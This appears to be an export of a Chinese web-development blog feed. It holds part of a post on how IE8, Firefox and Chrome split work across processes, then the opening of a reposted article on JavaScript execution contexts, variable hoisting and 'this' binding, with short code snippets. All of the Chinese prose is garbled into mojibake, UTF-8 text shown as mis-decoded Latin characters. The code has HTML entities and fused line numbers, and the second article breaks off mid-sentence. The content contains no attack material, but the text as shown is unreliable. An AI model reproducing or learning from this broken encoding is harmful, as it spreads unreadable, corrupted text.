åœ¨è¯´IEçš„å¤šçº¿ç¨‹ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆç®€å•äº†è§£ä¸€ä¸‹DLLè¿™ä¸ªä¸œè¥¿ï¼ŒDLLå«åšåŠ¨æ€é“¾æ¥åº“ï¼Œå¯ä»¥çœ‹åšæ˜¯æŸäº›ä¸ªç‰¹å®šåŠŸèƒ½å®ç°çš„ä»£ç åº“ï¼Œåœ¨windowsä¸Šç¼–ç¨‹è¦è°ƒç”¨ä¸€äº›windowsç³»ç»Ÿçš„åŠŸèƒ½çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥é€šè¿‡è°ƒç”¨ä¸€äº›DLLåº“ç»™æˆ‘ä»¬æä¾›å¯¹åº”çš„åŠŸèƒ½ã€‚ IEçš„ä¸»è¦è¿›ç¨‹å…¶å®å°±ä¸¤ç±»ï¼š æ¡†æ¶è¿›ç¨‹ã€‚ Tabè¿›ç¨‹ã€‚ æ¡†æ¶è¿›ç¨‹å°±æ˜¯æˆ‘ä»¬å›¾ä¸­æœ€ä¸Šæ–¹çš„é‚£ä¸ªçº¢è‰²åŒºåŸŸè¡¨ç¤ºçš„ä¸œè¥¿ï¼Œå®ƒå‘¢å…¶å®ä¸»è¦å°±æ˜¯ä¸€ä¸ªUIè¿›ç¨‹ï¼Œåº•å±‚ä½¿ç”¨äº† BrowseUI.dll è¿™ä¸ªDLLåº“ï¼Œç”¨æ¥æ„å»ºç”¨æˆ·ç•Œé¢ï¼ŒåŒ…æ‹¬å·¥å…·æ ã€èœå•ä¸€ç±»çš„ä¸œè¥¿ã€‚æ¡†æ¶è¿›ç¨‹å¯ä»¥åˆ›å»ºå¤šä¸ªTabè¿›ç¨‹ï¼ŒTabè¿›ç¨‹ä¸æ¡†æ¶è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡æ˜¯ç”¨äº†ALPCï¼ˆé«˜çº§æœ¬åœ°è°ƒç”¨ï¼‰çš„æœºåˆ¶ï¼Œè¿™ç§æœºåˆ¶æ˜¯windowså†…æ ¸ä¸­å¸¸ç”¨çš„ï¼Œæ„Ÿå…´è¶£å¯ä»¥è‡ªå·±å†å»äº†è§£ã€‚ Tabè¿›ç¨‹æ˜¯ç”¨æ¥æ¸²æŸ“é¡µé¢ï¼Œæ‰§è¡ŒJSä»£ç ï¼ˆå½“ç„¶è¿™é‡Œå¯èƒ½æ˜¯JScriptå’ŒVBscriptï¼Œå¯¹äºIE8è‡³å°‘ä¸æ˜¯æ ‡å‡†çš„Ecmascriptï¼‰ï¼Œä»¥åŠæ‰§è¡Œä¸€ä¸ªIEæ’ä»¶ç¨‹åºã€‚Tabè¿›ç¨‹é‡Œä¼šè°ƒç”¨åˆ°æœ‰å…³å†å²è®°å½•çš„ ShDocVw.dll åº“ï¼Œæœ‰å…³HTMLè§£æã€DOMç”Ÿæˆå’Œæ“ä½œå’ŒJScriptè„šæœ¬çš„ MSHTML.dllåº“ï¼Œæœ‰å…³ç½‘ç»œå’Œç¼“å­˜çš„ Winlnet.dll ä»¥åŠå†ä¸Šé¢åŒ…è£¹äº†ä¸€å±‚çš„æ›´å®‰å…¨çš„æä¾›ä¸‹è½½èµ„æºçš„ URLMon.dll åº“ç­‰ã€‚å¯èƒ½ä½ ä¼šæƒ³ Tabè¿›ç¨‹å°±æ˜¯è¯´ä¸€ä¸ªTabé¡µä¸€ä¸ªè¿›ç¨‹ä¹ˆï¼Ÿå®é™…ä¸Šä¸æ˜¯çš„ï¼Œè€ƒè™‘åˆ°åˆ›å»ºä¸€ä¸ªè¿›ç¨‹çš„å¼€é”€æ¯”è¾ƒå¤§ï¼Œåœ¨windowsä¸Šåˆ›å»ºä¸€ä¸ªæ–°çš„Tabè¿›ç¨‹ä¹Ÿéœ€è¦è½½å…¥è¿™ä¹ˆä¸€å †çš„åŠ¨æ€é“¾æ¥åº“ã€‚IE8çš„Tabè¿›ç¨‹æ•°ç›®æ˜¯æœ‰ä¸€å®šçš„é™åˆ¶ç­–ç•¥çš„ï¼Œå½“Tabè¿›ç¨‹è¾¾åˆ°æœ€å¤§é™åº¦çš„æ—¶å€™ï¼Œæ–°æ‰“å¼€çš„ç½‘é¡µä¼šå¤ç”¨ä¹‹å‰åˆ›å»ºçš„Tabè¿›ç¨‹æ¥å¤„ç†ã€‚ï¼ˆå¦ï¼šè¿™ä¸ªç­–ç•¥å­˜åœ¨äºwindowsæ³¨å†Œè¡¨ä¸­çš„ TabProcGrowth é”®å€¼ï¼Œä½ å¯ä»¥Googleä¸€ä¸‹è¿™ä¸ªé…ç½®ä¿¡æ¯çœ‹çœ‹æ”¹å˜å®ƒä¼šå¦‚ä½•æ”¹å˜Tabè¿›ç¨‹çš„ä½¿ç”¨ç­–ç•¥ï¼‰ Firefoxçš„å¤šè¿›ç¨‹æ¶æ„æ—©æœŸçš„firefoxä¹Ÿæ˜¯å•è¿›ç¨‹çš„ï¼Œå½“ä»–ä»¬ä¹Ÿå‘ç°æŠŠæ‰€æœ‰Tabé¡µçš„HTMLæ¸²æŸ“å’ŒJavaScriptæ‰§è¡Œï¼Œä»¥åŠæµè§ˆå™¨çª—å£çš„UIéƒ½æ”¾åˆ°ä¸€ä¸ªè¿›ç¨‹é‡Œæ˜¯ä¸€ä¸ªéå¸¸ç³Ÿç³•çš„è®¾è®¡çš„æ—¶å€™ï¼Œä¹Ÿå¼€å§‹åœ¨è¿›ç¨‹æ¶æ„ä¸Šåšå‡ºäº†è°ƒæ•´ã€‚ç„¶åMozillaå¯åŠ¨äº†ä¸€ä¸ªå«åš Electrolysis ï¼ˆä¹Ÿå«åš e10s ï¼‰çš„è®¡åˆ’å‡†å¤‡é€æ­¥å°†è¿›ç¨‹æ¶æ„å¾€å¤šè¿›ç¨‹ä¸Šå»è¿ç§»ï¼Œè¿™ä¸ªæ—¶é—´èŠ‚ç‚¹æ˜¯åœ¨2016å¹´ã€‚äºæ˜¯ç»å†äº†Firefoxä¸€å…±9ä¸ªç‰ˆæœ¬çš„è¿­ä»£ï¼Œä»Firefox 48 åˆ° 56ï¼Œé€æ­¥çš„å®Œå–„äº†å¤šè¿›ç¨‹æ¶æ„ã€‚ å¯¹äºæµè§ˆå™¨ä¸»è¿›ç¨‹ã€GPUè¿›ç¨‹ã€æ‰©å±•ç¨‹åºè¿›ç¨‹æ¥è¯´ï¼Œç›¸ä¿¡å„ä½å·²ç»å¾ˆäº†è§£äº†ã€‚ä¹Ÿå°±ä¸å¤šåºŸè¯äº†ã€‚ ä¸»è¦æ¥çœ‹Tabè¿›ç¨‹ï¼ŒTabè¿›ç¨‹å’ŒChromeçš„æ¸²æŸ“è¿›ç¨‹ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”¨æ¥æ¸²æŸ“é¡µé¢ï¼Œæ‰§è¡ŒJavascriptä»£ç çš„ã€‚ä¸è¿‡å¯¹äºFirefoxçš„Tabè¿›ç¨‹æ¥è¯´ï¼Œå¯ä»¥çœ‹å‡ºFirefoxçš„Tabè¿›ç¨‹å’ŒIEçš„Tabè¿›ç¨‹æœ‰ä¸ªç›¸ä¼¼ç‚¹å°±æ˜¯ï¼šæœ‰å¤šä¸ªTabè¿›ç¨‹ï¼Œä½†éƒ½ä¸ä¸€å®šæ˜¯ä¸€ä¸ªé¡µé¢ä¸€ä¸ªTabè¿›ç¨‹ï¼Œä¸€ä¸ªTabè¿›ç¨‹å¯èƒ½ä¼šè´Ÿè´£å¤šä¸ªé¡µé¢çš„æ¸²æŸ“ã€‚ä½œä¸ºå¯¹æ¯”ï¼ŒChromeæ˜¯ä»¥ä¸€ä¸ªé¡µé¢ä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ï¼ŒåŠ ä¸Šç«™ç‚¹éš”ç¦»çš„ç­–ç•¥æ¥è¿›è¡Œçš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯æƒ³è€ŒçŸ¥ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒChromeæ‰€éœ€è¦çš„å†…å­˜æ¶ˆè€—åº”è¯¥ä¹Ÿä¼šæ›´å¤šï¼Œæ¯•ç«Ÿä¸åƒFirefoxå’ŒIEä¸€æ ·å¯¹é¡µé¢æ¸²æŸ“æ‰€ç”¨çš„è¿›ç¨‹åšæœ€å¤§å€¼çš„é™åˆ¶ï¼Œç«™ç‚¹éš”ç¦»çš„ç­–ç•¥ä¹Ÿåªæ˜¯ä¼˜åŒ–äº†é‚£ä¹ˆä¸€äº›ã€‚æˆ‘åœ¨ä¸‹é¢é™„ä¸Šä¸€å¼ å†…å­˜æ¶ˆè€—å¯¹æ¯”å›¾ï¼Œå„ä½å¯ä»¥è‡ªè¡Œçœ‹ä¸€ä¸‹ã€‚ æ€»ç»“å¯¹äºæ—©æœŸçš„å•è¿›ç¨‹æµè§ˆå™¨æ¥è¯´ï¼Œé¡µé¢æ¸²æŸ“ã€JSæ‰§è¡Œã€æ’ä»¶è¿è¡Œã€è¿˜æœ‰æµè§ˆå™¨ä¸»ç¨‹åºçš„è¿è¡Œéƒ½æ”¾åœ¨å•ä¸ªçš„ä¸€ä¸ªè¿›ç¨‹é‡Œï¼Œå¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œæ— æ³•åº”ç”¨æ›´å¥½çš„å®‰å…¨ç‰¹æ€§ï¼Œè€Œä¸”å¾ˆå®¹æ˜“ä¸€å´©å…¨å´©ï¼Œå³ä½¿æ˜¯æ­£å¸¸è¿è¡Œä¹Ÿä¼šå‡ºç°ä¸€äº›ä¸æµç•…çš„é—®é¢˜ã€‚äºæ˜¯å„ä¸ªæµè§ˆå™¨å‚å•†æœ€ç»ˆéƒ½åœ¨å‘å¤šè¿›ç¨‹æµè§ˆå™¨åšè½¬å˜ï¼ŒChromeæµè§ˆå™¨åœ¨æœ€å¼€å§‹å‘å¸ƒçš„æ—¶å€™å°±æ˜¯é‡‡ç”¨äº†å¤šè¿›ç¨‹çš„æ¶æ„ï¼ŒIEæ˜¯ä»IE8å¼€å§‹åšçš„è°ƒæ•´ï¼Œè€ŒFirefoxåˆ™æ˜¯å¼€å¯ Electrolysis è®¡åˆ’ï¼Œåœ¨2016å¹´å‰åé€æ­¥å°†Firefoxè¿ç§»åˆ°äº†å¤šè¿›ç¨‹çš„æ¶æ„æ¨¡å¼ã€‚ åœ¨è¿ç§»çš„è¿‡ç¨‹ä¸­ï¼Œå„ä¸ªæµè§ˆå™¨æœ‰ä¸ªç›¸åŒç‚¹æ˜¯å„ä¸ªæµè§ˆå™¨éƒ½å°†æµè§ˆå™¨çš„ä¸»è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯ç”¨æ¥è¿è¡Œæµè§ˆå™¨çª—å£çš„è¿›ç¨‹å•ç‹¬æŠ½ç¦»æˆä¸€ä¸ªæ¥è¿è¡Œï¼Œä»¥æ­¤ä¸ºåŸºç¡€åˆ›å»ºå„ä¸ªå»è¿›è¡Œé¡µé¢æ¸²æŸ“çš„æ¸²æŸ“è¿›ç¨‹ç­‰å­è¿›ç¨‹ï¼Œå¹¶ç»Ÿä¸€ç®¡ç†ã€‚IE8çš„å¤šè¿›ç¨‹æ¶æ„æ¯”è¾ƒç®€å•ï¼Œä¸”å¼ºä¾èµ–äºwindowsç³»ç»Ÿçš„å„ç§åŠ¨æ€é“¾æ¥åº“ï¼›Chromeå‘¢æ¯”è¾ƒå¤§æ–¹çš„ç»™åˆ°æ¯ä¸ªé¡µé¢ä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ï¼ŒåŒæ—¶ä¹Ÿç”¨ç«™ç‚¹éš”ç¦»çš„ç­–ç•¥åšå¥½äº†ä¼˜åŒ–ï¼Œå¯¹æ’ä»¶è¿›ç¨‹ä¹Ÿæ˜¯æ¯”è¾ƒå¤§æ–¹çš„ç»™æ¯ä¸ªæ’ä»¶éƒ½æœ‰å•ç‹¬çš„è¿›ç¨‹ï¼Œè¿™æ ·æ‰§è¡Œçš„å„ä¸ªç¨‹åºä»è¿›ç¨‹å±‚é¢éš”ç¦»å¼€æ¥ï¼Œç›¸äº’å½±å“é™åˆ°å¾ˆå°çš„ç¨‹åº¦ï¼Œå”¯ä¸€çš„é—®é¢˜å°±æ˜¯è¿›ç¨‹åˆ†é…å¤ªå¤§æ–¹ï¼Œå†…å­˜å ç”¨ä¹Ÿä¸Šå»äº†ï¼›Firefoxåœ¨å¤šè¿›ç¨‹æ¶æ„çš„è®¾è®¡ä¸Šï¼Œç»™äº†ä¸€ä¸ªä¸“é—¨è¿è¡Œæ’ä»¶è¿›ç¨‹ï¼Œç”¨æ¥æ¸²æŸ“é¡µé¢çš„Tabè¿›ç¨‹å’ŒIE8çš„Tabè¿›ç¨‹æœ‰ä¸ªç›¸åŒç‚¹åœ¨äºéƒ½æ˜¯å¯¹Tabè¿›ç¨‹æœ‰ä¸ªæœ€å¤§å€¼çš„é™åˆ¶çš„ã€‚ å¦å¤–Chromeæœ€æ–°çš„è¿›ç¨‹æ¶æ„ä¹Ÿåœ¨å¾€SOAï¼Œä¹Ÿå°±æ˜¯é¢å‘æœåŠ¡çš„æ¶æ„çš„æ–¹å‘è½¬å‹ã€‚å®ç°çš„æ–¹å¼å°±æ˜¯å°†ç½‘ç»œã€è®¾å¤‡ã€UIã€åª’ä½“ä¸€ç±»çš„ç¨‹åºæŠ½è±¡ä¸ºæœåŠ¡ï¼Œç»Ÿä¸€æ”¾å…¥åŸºç¡€æœåŠ¡å±‚ä¸­ï¼Œä¾›æµè§ˆå™¨ä¸»è¿›ç¨‹ã€æ’ä»¶è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹è°ƒç”¨ã€‚åˆ©äºèŠ‚çœèµ„æºä»¥åŠæ‹¥æœ‰æ›´è‰¯å¥½å¯æ‰©å±•æ€§ï¼Œé™ä½ç°æœ‰å¤šè¿›ç¨‹æ¶æ„ä¸­è€¦åˆæ€§å¤ªé«˜çš„é—®é¢˜ã€‚è¿™å—å„¿å¯ä»¥å„ä½è‡ªè¡Œäº†è§£ï¼Œæ–‡æœ«ç»™å‡ºçš„å‚è€ƒèµ„æ–™ä¸­ä¹Ÿæœ‰æ¶‰åŠã€‚ ç›¸ä¿¡å„ä½å¯¹äºæµè§ˆå™¨çš„è¿›ç¨‹æ¶æ„è‡³å°‘ä¹Ÿç•¥çŸ¥ä¸€äºŒäº†ï¼Œå¸Œæœ›å¯¹ä½ çš„æ—¥å¸¸å¼€å‘æˆ–å¯¹æµè§ˆå™¨çš„ä½¿ç”¨ä¸Šæœ‰ä¸€å®šçš„å¸®åŠ©ã€‚ å‚è€ƒèµ„æ–™ Internet Explorer Wikipedia: en.wikipedia.org/wiki/Internâ€¦ Internet Exploere Architecture: docs.microsoft.com/en-us/previâ€¦ Modern Multi-Process Browser Architecture: helgeklein.com/blog/2019/0â€¦ Inside look at mordern web browser (part 1): developers.google.com/web/updatesâ€¦ Multi-process Architecture: dev.chromium.org/developers/â€¦ Multiprocess Firefox: developer.mozilla.org/en-US/docs/â€¦ Multi-Process Firefox: everything you need to know: (www.ghacks.net/2016/07/22/â€¦)[www.ghacks.net/2016/07/22/â€¦] æå®¢æ—¶é—´ã€Šæµè§ˆå™¨å·¥ä½œåŸç†ä¸å®æˆ˜ã€‹â€“ Chromeæ¶æ„: ä»…ä»…æ‰“å¼€äº†1ä¸ªé¡µé¢ï¼Œä¸ºä»€ä¹ˆæœ‰4ä¸ªè¿›ç¨‹ï¼Ÿ Servicification: www.chromium.org/servicificaâ€¦ Meltdown/Spectre: developers.google.com/web/updatesâ€¦ ç›¸å…³æ–‡ç«  ä»æµè§ˆå™¨å¤šè¿›ç¨‹åˆ°JSå•çº¿ç¨‹ï¼ŒJSè¿è¡Œæœºåˆ¶æœ€å…¨é¢çš„ä¸€æ¬¡æ¢³ç†]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥ç†è§£JSæ‰§è¡Œä¸Šä¸‹æ–‡çš„ç‚¹ç‚¹æ»´æ»´]]></title>
    <url>%2F2020%2F02%2F04%2FWeb%E5%89%8D%E7%AB%AF%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JS%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E7%9A%84%E7%82%B9%E7%82%B9%E6%BB%B4%E6%BB%B4%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5ce767eef265da1bbf68f724 å‰è¨€å¯¹äºä¸€åå‰ç«¯å¼€å‘è€…æ¥è¯´ï¼Œæ·±å…¥ç†è§£JavaScriptç¨‹åºå†…éƒ¨æ‰§è¡Œæœºåˆ¶å½“ç„¶æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼Œå…¶ä¸­ä¸€ä¸ªå…³é”®æ¦‚å¿µå°±æ˜¯JavaScriptçš„æ‰§è¡Œä¸Šä¸‹æ–‡å’Œæ‰§è¡Œæ ˆï¼Œç†è§£è¿™éƒ¨åˆ†å†…å®¹ä¹Ÿæœ‰åŠ©äºç†è§£ä½œç”¨åŸŸã€é—­åŒ…ç­‰ æœ¬æ¬¡é‡ç‚¹ æ‰§è¡Œä¸Šä¸‹æ–‡æ¦‚å¿µã€ç±»å‹ã€ç‰¹ç‚¹ æ‰§è¡Œä¸Šä¸‹æ–‡çš„ç”Ÿå‘½å‘¨æœŸ å…³äºå˜é‡æå‡ thisæŒ‡å‘é—®é¢˜ æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆ åŸºæœ¬æ¦‚å¿µï¼šæ‰€è°“çš„JavaScriptæ‰§è¡Œä¸Šä¸‹æ–‡å°±æ˜¯å½“å‰JSä»£ç ä»£ç è¢«è§£æå’Œæ‰§è¡Œæ—¶æ‰€åœ¨ç¯å¢ƒçš„æŠ½è±¡æ¦‚å¿µï¼Œjsä»£ç éƒ½æ˜¯åœ¨æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­è¿è¡Œçš„ ä¸€ã€æ‰§è¡Œä¸Šä¸‹æ–‡ç±»å‹1.å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡å®ƒçš„ç‰¹ç‚¹æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š a.å®ƒæ˜¯æœ€åŸºç¡€ã€é»˜è®¤çš„å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ b.å®ƒä¼šåˆ›å»ºä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œå¹¶ä¸”å°†thisæŒ‡å‘å…¨å±€å¯¹è±¡ï¼Œåœ¨æµè§ˆå™¨ä¸­å…¨å±€å¯¹è±¡æ˜¯windowï¼Œåœ¨nodejsä¸­å…¨å±€å¯¹è±¡æ˜¯global c.ä¸€ä¸ªç¨‹åºä¸­åªæœ‰ä¸€ä¸ª 2.å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡å®ƒçš„ç‰¹ç‚¹æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š a.æœ‰è‡ªå·±çš„æ‰§è¡Œä¸Šä¸‹æ–‡ b.å¯ä»¥åœ¨ä¸€ä¸ªç¨‹åºä¸­å­˜åœ¨ä»»æ„æ•°é‡ c.æ˜¯å‡½æ•°è¢«æ‰§è¡Œæ—¶åˆ›å»º 3.evalå‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ï¼ševalå‡½æ•°å¯ä»¥è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„jsä»£ç ï¼Œè¿™æ ·å°±ä¼šå­˜åœ¨ä¸€ä¸ªå®‰å…¨æ€§é—®é¢˜ï¼Œåœ¨ä»£ç å­—ç¬¦ä¸²æœªçŸ¥æˆ–è€…æ˜¯æ¥è‡ªäºç”¨æˆ·è¾“å…¥æºçš„è¯ï¼Œç»å¯¹ä¸è¦ä½¿ç”¨evalå‡½æ•° ä»¥ä¸Šå°±æ˜¯æ‰§è¡Œä¸Šä¸‹æ–‡çš„å‡ ç§ç±»å‹å’Œç›¸åº”çš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸‹ä¸‹é¢è¿™æ®µä»£ç ï¼š é‡Œé¢çš„ä¸‰ä¸ªå‡½æ•°éƒ½è¢«æ‰§è¡Œäº†ï¼Œæ‰€ä»¥æ˜¯æœ‰ä¸‰ä¸ªå‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ 12345678910111213// å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡var sayHello = &apos;Hello&apos;function someone() &#123; // å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ var first = &apos;Tom&apos;, last = &apos;Ada&apos; function getFirstName() &#123; // å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ return first &#125; function getLastName() &#123; // å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ return last &#125; console.log(sayHello + getFirstName() + getLastName())&#125;someone() äºŒã€æ‰§è¡Œä¸Šä¸‹æ–‡çš„ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œä¸Šä¸‹æ–‡çš„ç”Ÿå‘½å‘¨æœŸåˆ†äº†ä¸‰ä¸ªé˜¶æ®µï¼š åˆ›å»ºé˜¶æ®µ æ‰§è¡Œé˜¶æ®µ å›æ”¶é˜¶æ®µ åˆ›å»ºé˜¶æ®µå¯¹äºå‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œä½†æ˜¯è¿˜æœªæ‰§è¡Œé‡Œé¢çš„ä»£ç ä¹‹å‰ï¼Œä¼šåšä¸‰ä»¶äº‹æƒ…: åˆ›å»ºå˜é‡å¯¹è±¡ï¼šä¼šåˆå§‹åŒ–å‡½æ•°çš„å‚æ•°ï¼Œæå‡å‡½æ•°å£°æ˜å’Œå˜é‡å£°æ˜ åˆ›å»ºä½œç”¨åŸŸé“¾ï¼šä½œç”¨åŸŸé“¾ç”¨äºæ ‡è¯†ç¬¦è§£æï¼Œçœ‹ä¸‹é¢ä»£ç ï¼š f3å‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œé‡Œé¢çš„å˜é‡numè¦æ±‚è¢«è§£æçš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰f3çš„ä½œç”¨åŸŸé‡ŒæŸ¥æ‰¾ï¼Œå¦‚æœæ²¡æ‰¾åˆ°ï¼Œå°±ä¼šå‘ä¸Šä¸€å±‚ä½œç”¨åŸŸä¸­æŸ¥æ‰¾ï¼Œç›´åˆ°åœ¨å…¨å±€ä½œç”¨æ‰¾åˆ°è¯¥å˜é‡ä¸º30 1234567891011var num = 30;function f1() &#123; function f2() &#123; function f3() &#123; console.log(num); &#125; f3(); &#125; f2();&#125;f1(); ç¡®å®šthisæŒ‡å‘ï¼šè¿™ä¸ªæƒ…å†µæ¯”è¾ƒå¤šï¼Œä¼šåœ¨ä¸‹æ–‡ç»Ÿä¸€ä»‹ç» åœ¨ä¸€ä¸ªç¨‹åºæ‰§è¡Œä¹‹å‰ï¼Œè¦å…ˆè§£æä»£ç ï¼Œä¼šå…ˆåˆ›å»ºå…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒï¼ŒæŠŠéœ€è¦æ‰§è¡Œçš„å˜é‡å’Œå‡½æ•°å£°æ˜éƒ½å–å‡ºæ¥å¹¶æš‚æ—¶èµ‹å€¼ä¸ºundefinedï¼Œå‡½æ•°ä¹Ÿè¦å…ˆå£°æ˜å¥½å¾…è°ƒç”¨ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ä¸‹æ–‡ä¸­ä¼šè®²åˆ°çš„å˜é‡æå‡ï¼Œä»¥ä¸Šå‡ æ­¥åšå®Œåï¼Œå¼€å§‹æ­£å¼æ‰§è¡Œç¨‹åº æ‰§è¡Œé˜¶æ®µæ‰§è¡Œçš„å˜é‡èµ‹å€¼ã€å‡½æ•°è°ƒç”¨ç­‰ä»£ç æ‰§è¡Œ å›æ”¶é˜¶æ®µæ‰§è¡Œä¸Šä¸‹æ–‡å‡ºæ ˆï¼Œç­‰å¾…è™šæœºåƒåœ¾å›æ”¶æ‰§è¡Œä¸Šä¸‹æ–‡ ä¸‰ã€å˜é‡æå‡å˜é‡æå‡åˆ†ä¸ºä¸¤ç§ï¼š å˜é‡å£°æ˜æå‡ å‡½æ•°å£°æ˜æå‡ å…³äºå˜é‡å£°æ˜æå‡ï¼Œå…ˆçœ‹ä»¥ä¸‹ä»£ç ç‰‡æ®µï¼š 1234567console.log(a) // undefinedvar a = 5function test() &#123; console.log(a) // undefined var a = 10&#125;test() ä»¥ä¸Šä»£ç ä¸­ï¼Œç¬¬1ä¸ª a æ˜¯åœ¨å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼Œç”±äºåœ¨å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡åˆ›å»ºçš„æ—¶å€™ï¼ŒæŠŠéœ€è¦æ‰§è¡Œçš„å˜é‡å’Œå‡½æ•°å£°æ˜éƒ½å–å‡ºæ¥å¹¶æš‚æ—¶èµ‹å€¼ä¸ºundefinedï¼Œæ‰€ä»¥æ‰“å°å‡ºæ¥çš„å°±æ˜¯undefined ç¬¬2ä¸ª a æ˜¯åœ¨testè¿™ä¸ªå‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼ŒåŒä¸Šï¼Œæ‰€ä»¥æ‰“å°å‡ºæ¥çš„å°±æ˜¯undefined 123456789var aconsole.log(a) // undefineda = 5function test() &#123; var a console.log(a) // undefined a = 10&#125;test() å…³äºå‡½æ•°å£°æ˜æå‡ï¼Œçœ‹ä»¥ä¸‹ä»£ç : 1234console.log(f1) // function f1() &#123;&#125;function f1() &#123;&#125;console.log(f2) // undefinedvar f2 = function() &#123;&#125; æ‰“å°ç»“æœåœ¨æ³¨é‡Šä¸­ï¼Œç”±äºå˜é‡å£°æ˜å’Œå‡½æ•°å£°æ˜æå‡åŸåˆ™å¯ä»¥æŠŠä»£ç æ”¹æˆå¦‚ä¸‹ï¼š 12345function f1() &#123;&#125;console.log(f1) // function f1() &#123;&#125;var f2;console.log(f2) // undefinedf2 = function() &#123;&#125; f1å’Œf2ä¸ä¸€æ ·çš„åœ°æ–¹æ˜¯ï¼šf1æ˜¯æ™®é€šå‡½æ•°å£°æ˜çš„æ–¹å¼ï¼Œf2æ˜¯å‡½æ•°è¡¨è¾¾å¼ï¼Œåœ¨f2æœªè¢«èµ‹å€¼çš„æ—¶å€™ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªå˜é‡ï¼Œè¿™ä¸ªæ—¶å€™å˜é‡æå‡ï¼Œæ‰€ä»¥æ‰“å°çš„f2ä¸ºundefined å¦‚æœä¸€ä¸ªå˜é‡æ—¢æ˜¯å‡½æ•°å£°æ˜çš„æ–¹å¼ï¼Œåˆæ˜¯å˜é‡å£°æ˜çš„æ–¹å¼ï¼Œä»£ç å¦‚ä¸‹: æˆ‘ä»¬å‘ç°å‡½æ•°å£°æ˜çš„ä¼˜å…ˆçº§æ˜¯é«˜äºå˜é‡æå‡çš„ä¼˜å…ˆçº§çš„ 123456789function test(arg)&#123; console.log(arg); // function arg()&#123;console.log(&apos;hello world&apos;) &#125; var arg = &apos;hello&apos;; function arg()&#123; console.log(&apos;hello world&apos;) &#125; console.log(arg); // hello &#125;test(&apos;hi&apos;); æ€»ç»“ï¼šå˜é‡æå‡çš„å‡ ä¸ªç‰¹ç‚¹ï¼š å¦‚æœæœ‰å½¢å‚ï¼Œå…ˆç»™å½¢å‚èµ‹å€¼ å‡½æ•°å£°æ˜çš„ä¼˜å…ˆçº§æ˜¯é«˜äºå˜é‡æå‡çš„ä¼˜å…ˆçº§çš„ï¼Œä½†å¯ä»¥é‡æ–°èµ‹å€¼ ç§æœ‰ä½œç”¨åŸŸä»£ç ä»ä¸Šåˆ°ä¸‹æ‰§è¡Œ å››ã€ç¡®å®šthisæŒ‡å‘é—®é¢˜thisæŒ‡å‘é—®é¢˜é€šå¸¸ä¼šåœ¨ä¸€äº›é¢è¯•é¢˜ä¸­å‡ºç°ï¼Œæƒ…å†µæ¯”è¾ƒå¤šï¼Œå…ˆäº†è§£ä¸‹å®ƒçš„ä¸€äº›ç‰¹ç‚¹ï¼š thisæ˜¯æ‰§è¡Œä¸Šä¸‹æ–‡çš„ä¸€éƒ¨åˆ† éœ€è¦åœ¨æ‰§è¡Œæ—¶ç¡®å®š æµè§ˆå™¨ä¸­ this æŒ‡å‘ windowï¼Œ nodeä¸­thisæŒ‡å‘global å¯¹äºéä¸¥æ ¼æ¨¡å¼å’Œes5çš„jsç¨‹åºä¸­ï¼ŒthisæŒ‡å‘å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç§æƒ…å†µï¼šç¬¬ä¸€ç§ï¼ša()ç›´æ¥è°ƒç”¨çš„æ–¹å¼ï¼Œthis === window 12345function a() &#123; console.log(this.b) &#125;var b = 0a() æ‰“å°å‡ºçš„å€¼ä¸º 0 ç¬¬äºŒç§ï¼šè°è°ƒç”¨äº†å‡½æ•°ï¼Œè°å°±æ˜¯this 12345function a() &#123; console.log(this)&#125;var obj = &#123;a: a&#125;obj.a() æ‰“å°å‡ºçš„å€¼ä¸ºobjè¿™ä¸ªå¯¹è±¡ ç¬¬ä¸‰ç§ï¼šæ„é€ 